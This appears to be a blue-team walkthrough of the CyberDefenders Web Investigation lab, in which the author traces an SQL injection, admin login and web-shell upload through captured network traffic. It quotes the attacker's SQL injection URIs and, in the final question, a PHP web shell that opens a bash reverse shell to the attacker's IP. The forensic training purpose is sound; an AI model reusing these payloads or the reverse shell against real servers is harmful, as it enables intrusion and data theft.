# CyberDefenders----Web-Investigation-Lab

INTRO: 
This repository documents my walkthrough of the CyberDefenders Web Investigation challenge, a scenario designed to test and enhance blue team skills in analyzing network traffic and identifying the anatomy of a web-based attack. This challenge presents a realistic situation where a web server has been compromised, and the task is to investigate the incident, identify the attacker, determine the extent of the breach, and uncover the methods used to gain unauthorized access.

In this scenario, a malicious actor has successfully infiltrated a web application, exploiting vulnerabilities to gain unauthorized access and potentially exfiltrate sensitive data. The attack leverages a combination of techniques, including:

- SQL Injection: Exploiting weaknesses in the web application's database queries to bypass security measures and access confidential information.

- Credential Theft: Stealing user credentials to impersonate legitimate users and gain unauthorized access to restricted areas of the system.

- Malicious File Upload: Uploading a malicious script to the server to execute arbitrary commands and potentially compromise the entire system.

- Directory Traversal: Accessing hidden or restricted directories on the web server to uncover sensitive files and configuration information.

TOOLS USED:

- WIRESHARK [[https://www.wireshark.org/]: network protocol analyzer.
- NETWORK MINER [https://www.netresec.com/?page=NetworkMiner]: open source network forensics tool that extracts artifacts, such as files, images, emails and passwords, from captured network traffic in PCAP files.

Link to the challenge: https://cyberdefenders.org/blueteam-ctf-challenges/web-investigation/

SCENARIO: 

You are a cybersecurity analyst working in the Security Operations Center (SOC) of BookWorld, an expansive online bookstore renowned for its vast selection of literature. BookWorld prides itself on providing a seamless and secure shopping experience for book enthusiasts around the globe. Recently, you've been tasked with reinforcing the company's cybersecurity posture, monitoring network traffic, and ensuring that the digital environment remains safe from threats.
Late one evening, an automated alert is triggered by an unusual spike in database queries and server resource usage, indicating potential malicious activity. This anomaly raises concerns about the integrity of BookWorld's customer data and internal systems, prompting an immediate and thorough investigation.
As the lead analyst in this case, you are required to analyze the network traffic to uncover the nature of the suspicious activity. Your objectives include identifying the attack vector, assessing the scope of any potential data breach, and determining if the attacker gained further access to BookWorld's internal systems.

WALKTHROUGH:

Q1) By knowing the attacker's IP, we can analyze all logs and actions related to that IP and determine the extent of the attack, the duration of the attack, and the techniques used. Can you provide the attacker's IP?

There is a lot of traffic to cover, so is better to isolate the data we are looking for from the noise. We can do that analysing the traffic and the IP addresses involved in the communication. We go to Statistics > Endpoints > IPv4 tab and we can see that there is an unusual amount of transmitted and received data between two IP addresses: 73.124.22.98  and  111.224.250.131 .

One of the two external IPs that connected with the online store has a large number of packets compared with the other IP.

![q1](https://github.com/user-attachments/assets/544b070f-2010-4bf7-9f6b-bc87cbabee9d)

So I started with the IP:111.224.250.131.
I have analysed it on Network Miner to discover that he used malicious tools that appeared in the user agent section such as Go Buster and SQLMap. 

![q1-2](https://github.com/user-attachments/assets/49e36fee-3996-4818-b3f9-a362f585090a)

So the attacker IP will be 111.224.250.131.


Q2) If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Can you determine the origin city of the attacker?

Performing a simple IP check on the Internet with tools such as Iplocation.net I found that the attacker IP comes from Shijiazhuang, Hebei, China.

![q2](https://github.com/user-attachments/assets/6c237315-c08c-440c-a175-d94fca7cad26)

Q3) Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. This knowledge is critical for finding the appropriate patch or workaround to close the security gap and prevent future exploitation. Can you provide the vulnerable PHP script name?

In the first question we identified that the attacker uses malicious tools such as SQLMap.
SQLMap is a software utility for automated discovering of SQL injection vulnerabilities in web applications.

In Wireshark, using the display filter http contains ".php", we isolate HTTP requests that include references to PHP files in their URLs.The filtering has reveled an incredible amount of attempts targeting the search.php script, which is the vulnerable script name.

![q3](https://github.com/user-attachments/assets/1e6c5b0b-97b6-4b9c-8eac-513085c0d70e)

Q4) Establishing the timeline of an attack, starting from the initial exploitation attempt, What's the complete request URI of the first SQLi attempt by the attacker?

By examining the timing of the communication between the attacker IP address and the server, we can see that at event 357 there was the GET request method, in the specific: GET /search.php?search=book%20and%201=1;%20--%20- HTTP/1.1

This request is attempting to search for "book" but includes additional SQL-like syntax that could be an attempt to manipulate the server's database query: 
"?search=book%20and%201=1;%20--%20-" is the query string, which appears to be a malformed search query with potential SQL injection code:

![q4](https://github.com/user-attachments/assets/11671b71-c615-4871-91f1-89670e3e9fc3)

- "book" is likely the intended search term.

- "and 1=1;" is a common SQL injection technique.

- "--" is SQL comment syntax, often used in SQL injection attempts.

Q5) Can you provide the complete request URI that was used to read the web server available databases?

Based on Q3 and Q4, I found that the attacker is trying to perform SQL injection on the IP address“73.124.22.98".

As a result, I filtered the traffic in Wireshark to show the responses sent from the IP address “73.124.22.98” to the attacker using this filter:[ip.dst==111.224.250.131 and ip.src==73.124.22.98 and http.response.code==200]. 

![q5](https://github.com/user-attachments/assets/a8a61930-80d0-4dcc-9d12-025b3ce5ef65)

Then I have filtered further the packets with the filter string "MySQL" which pointed at packet 1525.
Following the HTTP stream we then find the URI displayed as such:

![q5-2](https://github.com/user-attachments/assets/eeca163a-4f03-482a-abbc-f2d5f40d5ede)

/search.php?search=book%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178766271%2CJSON_ARRAYAGG%28CONCAT_WS%280x7a76676a636b%2Cschema_name%29%29%2C0x7176706a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA — %20-

Q6) Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. What's the table name containing the website users data?

Let's use NetworkMiner to perform a search using filter with keyword search.php and then check by size:

![q6-1](https://github.com/user-attachments/assets/b7b5e7a7-341f-4aaa-82fa-9c6cab5fdadf)

We've found a fairly large size. Next, we will use Wireshark with the filter ip.addr == 111.224.250.131 && http.response.code == 200 && tcp.dstport == 38848.

![q6-2](https://github.com/user-attachments/assets/97530c95-7d94-493c-ac76-469c487c84a7)

We then follow the HTTPS stream of the package and we find the answer: customers.

![q6-3](https://github.com/user-attachments/assets/ceacfc81-4b90-441d-a14b-2c0675bc75bc)

Q7) The website directories hidden from the public could serve as an unauthorized access point or contain sensitive functionalities not intended for public access. Can you provide the name of the directory discovered by the attacker?

![q7-1](https://github.com/user-attachments/assets/c6a64439-5b2c-4f03-8b52-ffcff45ca7ff)

We trying filtering with the keywords ip.addr 111.224.250.131 && http.response.code == 200  and then searching for admin.

![q7-2](https://github.com/user-attachments/assets/40f54e9a-3299-478b-9fc0-faf486f2d946)

Analysing the marked packet and following the HTTP stream we will find the directory discovered by the attacker: /admin/ .

![q7-3](https://github.com/user-attachments/assets/eab19d04-ea99-411a-a1e1-323087738504)


Q8) Knowing which credentials were used allows us to determine the extent of account compromise. What are the credentials used by the attacker for logging in?

To start, I've used the filter and search with the keyword ip.addr == 111.224.250.131 && http.request.method == POST then examine the activities for successful logins and we focus on the attemps to access /admin/login.php .

![q8-1](https://github.com/user-attachments/assets/056bd18c-da0e-41de-8b82-9352cc450cc4)

This payload shows the attacker attempted to log in using the username admin and the password admin123!

![q8-2](https://github.com/user-attachments/assets/906cd202-9905-43c1-bfe0-0d5781811a8a)

Q9) We need to determine if the attacker gained further access or control of our web server. What's the name of the malicious script uploaded by the attacker?

Continuing with the same filter used in in the previous question (ip.src == 111.224.250.131 and http.request.method == "POST"), I focused on investigating the attacker’s actions after gaining administrative access.

![q9-1](https://github.com/user-attachments/assets/52bd6ad8-1a78-47ee-93a5-7c0d825a1a94)

In the last package (highlighted in the photo) I discovered that the attacker uploaded a file named NVri2vhp.php. 

![q9-2](https://github.com/user-attachments/assets/62203d3e-f412-4877-bea4-c38e68674087)

and also found the following file: <?php exec(“/bin/bash -c ‘bash -i >& /dev/tcp/”111.224.250.131"/443 0>&1’”);?>.
The attacker successfully sent a file containing a shell, enabling them to control the web server and eventually allow the him to perform further exploits.


CONCULSIONS

After completing the CyberDefenders Web Investigation challenge, several key findings and insights were uncovered that demonstrate the importance of meticulous analysis and the use of powerful tools in cybersecurity investigations. Below are the conclusions drawn from the walkthrough:

1. Identification of the Attacker
The attacker’s IP address was identified by analyzing unusual spikes in database queries using Wireshark's conversation statistics. This allowed us to pinpoint malicious activity originating from a specific source.

2. Extent of the Attack
By examining packet data, it was evident that the attacker exploited SQL injection vulnerabilities to access sensitive database information, including table names like "customers," which contained user data.

3. Unauthorized Access
The attacker gained unauthorized access to the system by leveraging stolen credentials. These credentials were extracted from HTTP POST requests using tools like NetworkMiner and Wireshark.

4. Malicious Activities
The investigation revealed that the attacker successfully uploaded a malicious script to the server. This was identified through packet analysis of file upload requests, highlighting a critical breach in web application security.

5. Discovery of Hidden Directories
The attacker accessed hidden directories on the web server that were not intended for public access, potentially exposing sensitive functionalities.

Tools Utilized
- Wireshark: Essential for analyzing network traffic, filtering packets, and identifying malicious activities.

- NetworkMiner: Used for extracting credentials and reconstructing sessions, providing a deeper understanding of the attack's scope.

Key Learnings
- Proactive Monitoring: Regularly monitoring network traffic can help detect anomalies early.

- Defense Against SQL Injection: Strengthening input validation and sanitization is critical to prevent such attacks.

- Credential Security: Implementing multi-factor authentication (MFA) and secure credential storage can mitigate unauthorized access risks.

- Incident Response Preparedness: Having a robust incident response plan ensures quick containment and recovery from breaches.

This challenge was an excellent opportunity to practice real-world cybersecurity skills and understand how attackers operate. It reinforced the importance of tools like Wireshark and NetworkMiner in uncovering critical evidence during investigations.

A huge thank you to the creators of the WebStrike challenge! This was an incredibly well-designed exercise that provided a realistic and engaging learning experience. The challenge perfectly balanced complexity and clarity, allowing me to refine my network forensics skills while deepening my understanding of web application security. The practical application of concepts made this far more valuable than theoretical learning alone. I appreciate the time and effort put into creating such a valuable resource for the cybersecurity community. Thank you for contributing to my growth as a blue team analyst!

I hope you found this walkthrough insightful as well! If you found this content helpful, please consider giving it a clap! Your feedback is invaluable and motivates me to continue supporting your journey in the cybersecurity community. Remember, LET'S ALL BE MORE SECURE TOGETHER! For more insights and updates on cybersecurity analysis, follow me on Substack! [https://substack.com/@atlasprotect?r=1f5xo4&utm_campaign=profile&utm_medium=profile-page]
